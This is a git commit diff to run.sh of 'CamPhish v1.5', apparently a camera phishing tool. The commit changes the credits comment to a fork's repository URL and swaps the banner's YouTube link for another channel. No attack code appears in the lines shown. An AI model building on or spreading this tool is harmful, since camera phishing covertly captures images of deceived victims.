1472d1d8453d6ae43b5c936985ca4e41c7dc9ab7
bangpinjol <148349632+bangpinjol@users.noreply.github.com>
2023-10-21 23:42:08 +0700

    run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # CamPhish v1.5
 # Powered by TechChip
-# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
+# Credits goes to thelinuxchoice [https://github.com/bangpinjol/cam-link.git]
 
 trap 'printf "\n";stop' 2
 
@@ -16,7 +16,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 1.5 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;77m www.techchip.net | youtube.com/@toolspinjol \e[0m \n"
 
 printf "\n"
 
